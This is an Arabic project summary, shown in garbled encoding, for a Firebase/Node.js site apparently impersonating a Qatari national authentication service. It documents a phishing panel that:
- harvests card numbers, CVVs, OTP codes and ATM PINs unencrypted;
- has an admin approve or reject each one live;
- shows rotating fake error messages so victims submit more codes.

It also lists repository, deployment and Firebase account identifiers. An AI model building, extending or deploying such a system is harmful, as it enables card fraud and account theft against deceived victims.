# ููุฎุต ุดุงูู ููุธุงู ุงูุชูุซูู ุงููุทูู - Firebase Backend

## ๐ฏ ูุธุฑุฉ ุนุงูุฉ

ุชู ุจูุงุก ูุธุงู backend ูุชูุงูู ุจุงุณุชุฎุฏุงู Firebase ููููุน ุงูุชูุซูู ุงููุทููุ ูุชุถูู:
- ุชุชุจุน ุงูุฒูุงุฑ ูู ุงูููุช ุงููุนูู
- ุญูุธ ุงูุจูุงูุงุช ุชููุงุฆูุงู
- ูุธุงู ููุงููุฉ ุงูุฏูุน
- ูุธุงู ููุงููุฉ OTP
- ููุญุฉ ุชุญูู ููุฃุฏูู

## ๐ ุงูุจููุฉ ุงูุชูููุฉ

### ุงูุชูููุงุช ุงููุณุชุฎุฏูุฉ
- **Backend**: Node.js + Express
- **Database**: Firebase Firestore
- **Frontend**: EJS Templates
- **Deployment**: Vercel (ูุชุตู ุจู GitHub)
- **Version Control**: GitHub

### ุงููููุงุช ุงูุฑุฆูุณูุฉ

| ุงูููู | ุงููุธููุฉ |
|------|---------|
| `server.js` | ุงูุณูุฑูุฑ ุงูุฑุฆูุณู ูุน ุฌููุน APIs |
| `firebase-config.js` | ุฅุนุฏุงุฏุงุช Firebase Admin SDK |
| `sys-track.js` | ูุธุงู ุชุชุจุน ุงูุฒูุงุฑ |
| `data-save.js` | ุญูุธ ุงูุจูุงูุงุช ูู ุงูููุช ุงููุนูู |
| `admin-api.js` | APIs ููุญุฉ ุงูุชุญูู |
| `public/client-track.js` | ุชุชุจุน ุงูุฒูุงุฑ ูู ุฌุงูุจ ุงูุนููู |
| `views/step4.ejs` | ุตูุญุฉ ุงูุฏูุน ู OTP |
| `.env.production` | ูุชุบูุฑุงุช ุงูุจูุฆุฉ |

## ๐ ูุธุงู ุชุชุจุน ุงูุฒูุงุฑ

### ุงูููุฒุงุช
1. **ุฑูู ูุฑุฌุนู ูุฑูุฏ (vid)**
   - ูุชู ุฅูุดุงุคู ุชููุงุฆูุงู ุนูุฏ ุฃูู ุฒูุงุฑุฉ
   - ููุญูุธ ูู Cookie ููุฏุฉ 30 ููู
   - ุตูุบุฉ: `VID-XXXXXX` (6 ุฃุฑูุงู ุนุดูุงุฆูุฉ)

2. **ูุนูููุงุช ุงูุฒุงุฆุฑ**
   - ุงูุฏููุฉ (Country)
   - ุงููุชุตูุญ (Browser)
   - ูุธุงู ุงูุชุดุบูู (OS)
   - ุนููุงู IP
   - ููุน ุงูุฌูุงุฒ (Device Type)

3. **ุงูุญุงูุฉ Online/Offline**
   - ุชุชุจุน ุญุงูุฉ ุงูุฒุงุฆุฑ ูู ุงูููุช ุงููุนูู
   - ุชุญุฏูุซ ุชููุงุฆู ุนูุฏ ุงูุฏุฎูู ูุงูุฎุฑูุฌ
   - heartbeat ูู 30 ุซุงููุฉ

4. **ุชุชุจุน ุงูุตูุญุงุช**
   - ุชุณุฌูู ุงูุตูุญุฉ ุงูุญุงููุฉ
   - ุชุงุฑูุฎ ุงูุชููู ุจูู ุงูุตูุญุงุช
   - ุขุฎุฑ ุตูุญุฉ ุชูุช ุฒูุงุฑุชูุง

## ๐พ ูุธุงู ุญูุธ ุงูุจูุงูุงุช

### ุงูุญูุธ ุงูุชููุงุฆู
- **Debounce**: 500ms (ูุตู ุซุงููุฉ)
- ูุชู ุงูุญูุธ ุชููุงุฆูุงู ุนูุฏ ูุชุงุจุฉ ุงููุณุชุฎุฏู
- ูุง ุญุงุฌุฉ ููุถุบุท ุนูู ุฒุฑ ุญูุธ

### ุจููุฉ ุงูุจูุงูุงุช ูู Firebase

```
visitors/{vid}/
โโโ info/                      # ูุนูููุงุช ุงูุฒุงุฆุฑ
โ   โโโ vid: "VID-123456"
โ   โโโ ref: "REF-789012"
โ   โโโ country: "Qatar"
โ   โโโ browser: "Chrome"
โ   โโโ os: "Windows"
โ   โโโ ip: "192.168.1.1"
โ   โโโ deviceType: "Desktop"
โ   โโโ online: true
โ   โโโ currentPage: "step2"
โ   โโโ lastUpdated: "2025-12-15T08:00:00.000Z"
โ   โโโ createdAt: "2025-12-15T07:00:00.000Z"
โ
โโโ data/                      # ุจูุงูุงุช ุงูููุงุฐุฌ
โ   โโโ step2/                 # ุจูุงูุงุช ุงูุฎุทูุฉ 2
โ   โ   โโโ name: "ุฃุญูุฏ ูุญูุฏ"
โ   โ   โโโ nationalId: "12345678901"
โ   โ   โโโ birthDate: "1990-01-01"
โ   โ   โโโ ...
โ   โ
โ   โโโ step3/                 # ุจูุงูุงุช ุงูุฎุทูุฉ 3
โ   โ   โโโ address: "ุงูุฏูุญุฉ"
โ   โ   โโโ ...
โ   โ
โ   โโโ step4/                 # ุจูุงูุงุช ุงูุฎุทูุฉ 4
โ       โโโ ...
โ
โโโ payment/                   # ุจูุงูุงุช ุงูุฏูุน
โ   โโโ card_status: "pending" | "approved" | "rejected"
โ   โโโ statusUpdatedAt: "2025-12-15T08:00:30.000Z"
โ   โโโ current: {
โ   โ   cardNumber: "4111111111111111"
โ   โ   expiryDate: "12/25"
โ   โ   cvv: "123"
โ   โ   cardHolder: "AHMED MOHAMED"
โ   โ   timestamp: "2025-12-15T08:00:00.000Z"
โ   โ   attemptNumber: 1
โ   โ }
โ   โโโ history: {
โ       attempt_1: { ... }
โ       attempt_2: { ... }
โ     }
โ
โโโ otp/                       # ุจูุงูุงุช OTP
    โโโ otp_status: "pending" | "approved" | "rejected"
    โโโ statusUpdatedAt: "2025-12-15T08:05:00.000Z"
    โโโ current: {
    โ   otp: "123456"
    โ   timestamp: "2025-12-15T08:05:00.000Z"
    โ   attemptNumber: 1
    โ }
    โโโ history: {
        attempt_1: { ... }
        attempt_2: { ... }
      }
```

## ๐ณ ูุธุงู ููุงููุฉ ุงูุฏูุน

### ุณูุฑ ุงูุนูู

1. **ุงููุณุชุฎุฏู ูุฏุฎู ุจูุงูุงุช ุงูุจุทุงูุฉ**
   - ุฑูู ุงูุจุทุงูุฉ
   - ุชุงุฑูุฎ ุงูุงูุชูุงุก
   - CVV
   - ุงุณู ุญุงูู ุงูุจุทุงูุฉ

2. **ุงูุญูุธ ูุงูุงูุชุธุงุฑ**
   - ูุชู ุญูุธ ุงูุจูุงูุงุช ูุน `card_status: "pending"`
   - ูุธูุฑ ููุฏุงู ุงูุชุธุงุฑ ูุน ุฑุณุงูุฉ "ุฌุงุฑู ูุนุงูุฌุฉ ุงูุฏูุน..."
   - ุงูุชุญูู ุงูุฏูุฑู ูู ุงูููุงููุฉ ูู ุซุงููุฉ

3. **ุงูุฃุฏูู ูุฑุงุฌุน ูููุฑุฑ**
   - ูุฑู ุจูุงูุงุช ุงูุจุทุงูุฉ ูู ููุญุฉ ุงูุชุญูู
   - ููุงูู ุฃู ูุฑูุถ ุนุจุฑ `/api/admin/approve-payment`

4. **ุงููุชูุฌุฉ**
   - **ุฅุฐุง ููุงููุฉ**: ููุบูู ููุฏุงู ุงูุงูุชุธุงุฑ ููููุชุญ ููุฏุงู OTP
   - **ุฅุฐุง ุฑูุถ**: ูุธูุฑ alert ูุน ุฑุณุงูุฉ ุฎุทุฃ ููุชู ูุณุญ ุงูุญููู

### ุชุชุจุน ุงููุญุงููุงุช
- ูู ูุญุงููุฉ ุฏูุน ุชูุญูุธ ูู `payment.history`
- ุงููุญุงููุฉ ุงูุญุงููุฉ ูู `payment.current`
- ูุชู ุชุณุฌูู:
  - ุจูุงูุงุช ุงูุจุทุงูุฉ ุงููุงููุฉ (ุจุฏูู ุชุดููุฑ)
  - ููุช ุงูุฅุฏุฎุงู
  - ุฑูู ุงููุญุงููุฉ
  - ุงูุญุงูุฉ (pending/approved/rejected)
  - ููุช ุชุญุฏูุซ ุงูุญุงูุฉ

## ๐ ูุธุงู ููุงููุฉ OTP

### ุงูููุฒุงุช ุงูุฎุงุตุฉ

1. **Spinner ุจููุก ุงูุดุงุดุฉ**
   - ูุธูุฑ ูู ููุชุตู ุงูุดุงุดุฉ
   - ุฎูููุฉ ุดูุงูุฉ ุฏุงููุฉ
   - ูุณุชูุฑ ุญุชู ุงูููุงููุฉ/ุงูุฑูุถ

2. **ุฑุณุงุฆู ุฎุทุฃ ูุชุนุฏุฏุฉ**
   - ุชุธูุฑ **ุชุญุช ุญูู ุงูุฅุฏุฎุงู** (ููุณ ูู alert)
   - ุชุชุบูุฑ ุญุณุจ ุฑูู ุงููุญุงููุฉ:

| ุงููุญุงููุฉ | ุฑุณุงูุฉ ุงูุฎุทุฃ |
|---------|------------|
| 1 | ุฅุฏุฎุงู ุฎุงุทุฆ ูุฑูุฒ ุงูุชุญูู |
| 2 | ุชู ุฅุฑุณุงู ุงูุฑูุฒ ุจุดูู ุฎุงุทุฆ |
| 3 | ุงูุฑูุฒ ูุฑููุถ |
| 4 | ุฑูุฒ ุบูุฑ ุตุงูุญ |
| 5+ | ุงูุชูุช ุตูุงุญูุฉ ุงูุฑูุฒ |

### ุณูุฑ ุงูุนูู

1. **ุงููุณุชุฎุฏู ูุฏุฎู OTP**
   - ููุชุจ ุงูุฑูุฒ (4 ุฃู 6 ุฃุฑูุงู)
   - ูุถุบุท ุนูู Submit

2. **ุงูุญูุธ ูุนุฑุถ Spinner**
   - ูุชู ุญูุธ OTP ูุน `otp_status: "pending"`
   - ูุธูุฑ Spinner ุจููุก ุงูุดุงุดุฉ
   - ุงูุชุญูู ุงูุฏูุฑู ูู ุงูููุงููุฉ ูู ุซุงููุฉ

3. **ุงูุฃุฏูู ูุฑุงุฌุน ูููุฑุฑ**
   - ูุฑู ุฑูุฒ OTP ูู ููุญุฉ ุงูุชุญูู
   - ููุงูู ุฃู ูุฑูุถ ุนุจุฑ `/api/admin/approve-otp`

4. **ุงููุชูุฌุฉ**
   - **ุฅุฐุง ููุงููุฉ**: ููุฎูู Spinner ููููุชุญ ููุฏุงู ATM PIN
   - **ุฅุฐุง ุฑูุถ**: ููุฎูู Spinnerุ ุชุธูุฑ ุฑุณุงูุฉ ุงูุฎุทุฃ ุงูููุงุณุจุฉุ ูููุณุญ ุงูุญูู

### ุชุชุจุน ุงููุญุงููุงุช
- ููุณ ูุธุงู ุงูุฏูุน
- ูู ูุญุงููุฉ ูู `otp.history`
- ุงููุญุงููุฉ ุงูุญุงููุฉ ูู `otp.current`

## ๐ APIs ุงููุชุงุญุฉ

### APIs ุงูุฒูุงุฑ

| Endpoint | Method | ุงููุธููุฉ |
|---------|--------|---------|
| `/api/save-field` | POST | ุญูุธ ุญูู ูุงุญุฏ |
| `/api/visitor/online` | POST | ุชุญุฏูุซ ุญุงูุฉ online |
| `/api/visitor/offline` | POST | ุชุญุฏูุซ ุญุงูุฉ offline |
| `/api/check-redirect` | GET | ุงูุชุญูู ูู ุฅุนุงุฏุฉ ุงูุชูุฌูู |
| `/api/save-payment` | POST | ุญูุธ ุจูุงูุงุช ุงูุฏูุน |
| `/api/check-payment-approval` | GET | ุงูุชุญูู ูู ููุงููุฉ ุงูุฏูุน |
| `/api/save-otp` | POST | ุญูุธ OTP |
| `/api/check-otp-approval` | GET | ุงูุชุญูู ูู ููุงููุฉ OTP |

### APIs ุงูุฃุฏูู

| Endpoint | Method | ุงููุธููุฉ |
|---------|--------|---------|
| `/api/admin/visitors` | GET | ูุงุฆูุฉ ุฌููุน ุงูุฒูุงุฑ |
| `/api/admin/visitor/:vid` | GET | ุชูุงุตูู ุฒุงุฆุฑ ูุญุฏุฏ |
| `/api/admin/visitors/online` | GET | ูุงุฆูุฉ ุงูุฒูุงุฑ Online |
| `/api/admin/redirect-visitor` | POST | ุฅุนุงุฏุฉ ุชูุฌูู ุฒุงุฆุฑ |
| `/api/admin/approve-payment` | POST | ููุงููุฉ/ุฑูุถ ุงูุฏูุน |
| `/api/admin/approve-otp` | POST | ููุงููุฉ/ุฑูุถ OTP |
| `/api/admin/statistics` | GET | ุฅุญุตุงุฆูุงุช ุงููุธุงู |

## ๐จ ูุงุฌูุฉ ุงููุณุชุฎุฏู

### ุงูุตูุญุงุช

1. **index.ejs** - ุงูุตูุญุฉ ุงูุฑุฆูุณูุฉ
2. **step1.ejs** - ุงูุฎุทูุฉ 1
3. **step2.ejs** - ุฅุฏุฎุงู ุงูุจูุงูุงุช ุงูุดุฎุตูุฉ
4. **step3.ejs** - ุฅุฏุฎุงู ุจูุงูุงุช ุฅุถุงููุฉ
5. **step4.ejs** - ุงูุฏูุน ู OTP ู ATM PIN

### ุงูููุฏุงูุงุช ูู step4.ejs

1. **ููุฏุงู ุงูุชุธุงุฑ ุงูุฏูุน**
   - ุฑุณุงูุฉ: "ุฌุงุฑู ูุนุงูุฌุฉ ุงูุฏูุน..."
   - Spinner ูุชุญุฑู

2. **ููุฏุงู OTP (Verified by Visa)**
   - ุชูุงุตูู ุงููุนุงููุฉ
   - ุญูู ุฅุฏุฎุงู OTP
   - ุฑุณุงุฆู ุงูุฎุทุฃ ุชุญุช ุงูุญูู
   - Spinner ุจููุก ุงูุดุงุดุฉ ุนูุฏ ุงูุงูุชุธุงุฑ

3. **ููุฏุงู ATM PIN**
   - ุฅุฏุฎุงู ุงูุฑูุฒ ุงูุณุฑู ููุตุฑุงู ุงูุขูู

## ๐ ุงููุดุฑ ูุงูุชุญุฏูุซ

### GitHub Repository
- **URL**: https://github.com/anasabukharma/auth-system
- **Branch**: master
- **ุขุฎุฑ Commit**: "Add OTP approval system with spinner and multiple rejection messages"
- **SHA**: d1b6a39ad623a9e1b222732105d24fdf3e8a996e

### Vercel Deployment
- **Project ID**: prj_zIV1dyWtYMftAeRno1cMNvkZtJ3W
- **Team ID**: team_2cdunh720wn9NAufpt6a3068
- **Status**: READY (ุชู ุงููุดุฑ ุจูุฌุงุญ)
- **URL**: auth-system-in77x869x-afshalomor2-gmailcoms-projects.vercel.app

### ุงูุชุญุฏูุซ ุงูุชููุงุฆู
- ุนูุฏ push ุฅูู GitHubุ ูุชู ุงููุดุฑ ุชููุงุฆูุงู ุนูู Vercel
- ูุง ุญุงุฌุฉ ูุฅุนุงุฏุฉ ุงููุดุฑ ูุฏููุงู

## ๐ง ุงูุฅุนุฏุงุฏุงุช

### ูุชุบูุฑุงุช ุงูุจูุฆุฉ (.env.production)

```env
# Firebase Configuration
FIREBASE_PROJECT_ID=twtheeq-8785a
FIREBASE_CLIENT_EMAIL=firebase-adminsdk-fbsvc@twtheeq-8785a.iam.gserviceaccount.com
FIREBASE_PRIVATE_KEY=-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n
FIREBASE_DATABASE_URL=https://twtheeq-8785a.firebaseio.com

# Service Account Path
SERVICE_ACCOUNT_PATH=/home/ubuntu/upload/twtheeq-8785a-firebase-adminsdk-fbsvc-6f414f6439.json
```

### Firebase Service Account
- **ุงูููู**: `twtheeq-8785a-firebase-adminsdk-fbsvc-6f414f6439.json`
- **ุงููููุน**: `/home/ubuntu/upload/`
- **ุงููุดุฑูุน**: twtheeq-8785a

## ๐ ุงูุฅุญุตุงุฆูุงุช ุงููุชุงุญุฉ

ุนุจุฑ `/api/admin/statistics`:
- ุฅุฌูุงูู ุนุฏุฏ ุงูุฒูุงุฑ
- ุนุฏุฏ ุงูุฒูุงุฑ Online
- ุนุฏุฏ ุงูุฒูุงุฑ Offline
- ุฅุญุตุงุฆูุงุช ุงูุฏูุน (pending/approved/rejected)
- ุฅุญุตุงุฆูุงุช OTP (pending/approved/rejected)

## โ ุงูููุฒุงุช ุงูููุชููุฉ

- โ ูุธุงู ุชุชุจุน ุงูุฒูุงุฑ ุจุฃุฑูุงู ูุฑุฌุนูุฉ ูุฑูุฏุฉ
- โ ุญูุธ ุงูุจูุงูุงุช ูู ุงูููุช ุงููุนูู (500ms debounce)
- โ ุชุชุจุน ุญุงูุฉ Online/Offline
- โ ุฌูุน ูุนูููุงุช ุงูุฒุงุฆุฑ (IP, Browser, OS, Country, Device)
- โ ูุธุงู ููุงููุฉ ุงูุฏูุน ูุน ุชุชุจุน ุงููุญุงููุงุช
- โ ูุธุงู ููุงููุฉ OTP ูุน:
  - Spinner ุจููุก ุงูุดุงุดุฉ
  - ุฑุณุงุฆู ุฎุทุฃ ูุชุนุฏุฏุฉ ุชุญุช ุงูุญูู
  - ุชุชุจุน ุงููุญุงููุงุช
- โ APIs ูุงููุฉ ููุฃุฏูู
- โ ุงููุดุฑ ุนูู Vercel ูุน GitHub Integration
- โ ุชูุซูู ุดุงูู ูููุธุงู

## ๐ ููุงุญุธุงุช ูููุฉ

1. **ุนุฏู ุงูุชุดููุฑ**: ุจูุงูุงุช ุงูุฏูุน ู OTP ุชูุญูุธ ุจุฏูู ุชุดููุฑ ูู Firebase (ุญุณุจ ุทูุจ ุงูุนููู)
2. **ุงููุบุฉ**: ุงููุงุฌูุฉ ุจุงูุนุฑุจูุฉ ุจุงููุงูู
3. **ุงูุญูุธ ุงูุชููุงุฆู**: ูุง ุญุงุฌุฉ ูุฒุฑ ุญูุธุ ูู ุดูุก ููุญูุธ ุชููุงุฆูุงู
4. **ุงูุชุชุจุน ุงูุดุงูู**: ูู ุญุฑูุฉ ููุฒุงุฆุฑ ูุณุฌูุฉ ูู Firebase

## ๐ ุฑูุงุจุท ูููุฏุฉ

- [Firebase Console](https://console.firebase.google.com/project/twtheeq-8785a)
- [GitHub Repository](https://github.com/anasabukharma/auth-system)
- [Vercel Dashboard](https://vercel.com/afshalomor2-gmailcoms-projects/auth-system)
- [ุชูุซูู ูุธุงู ุงูุฏูุน](./PAYMENT_APPROVAL_SYSTEM.md)
- [ุชูุซูู ูุธุงู OTP](./OTP_APPROVAL_SYSTEM.md)

## ๐ฏ ุงูุฎุทูุงุช ุงูุชุงููุฉ ุงูููุชุฑุญุฉ

1. **ููุญุฉ ุชุญูู Admin UI**
   - ุฅูุดุงุก ูุงุฌูุฉ ูุณุชุฎุฏู ููุฃุฏูู
   - ุนุฑุถ ุงูุฒูุงุฑ ูู ุงูููุช ุงููุนูู
   - ุฃุฒุฑุงุฑ ุงูููุงููุฉ/ุงูุฑูุถ

2. **ุฅุดุนุงุฑุงุช ูู ุงูููุช ุงููุนูู**
   - ุฅุดุนุงุฑ ููุฃุฏูู ุนูุฏ ูุญุงููุฉ ุฏูุน ุฌุฏูุฏุฉ
   - ุฅุดุนุงุฑ ุนูุฏ ูุญุงููุฉ OTP ุฌุฏูุฏุฉ

3. **ุชูุงุฑูุฑ ูุชุญูููุงุช**
   - ุชูุงุฑูุฑ ููููุฉ/ุฃุณุจูุนูุฉ/ุดูุฑูุฉ
   - ุชุญููู ุณููู ุงูุฒูุงุฑ
   - ูุนุฏูุงุช ุงูููุงููุฉ/ุงูุฑูุถ

4. **ูุธุงู ATM PIN**
   - ุฅุถุงูุฉ ููุณ ูุธุงู ุงูููุงููุฉ ูู ATM PIN
   - ุชุชุจุน ูุญุงููุงุช ATM PIN

---

**ุชู ุฅูุดุงุก ูุฐุง ุงูููุฎุต ูู**: 15 ุฏูุณูุจุฑ 2025  
**ุงูุฅุตุฏุงุฑ**: 1.0  
**ุงูุญุงูุฉ**: ููุชูู โ
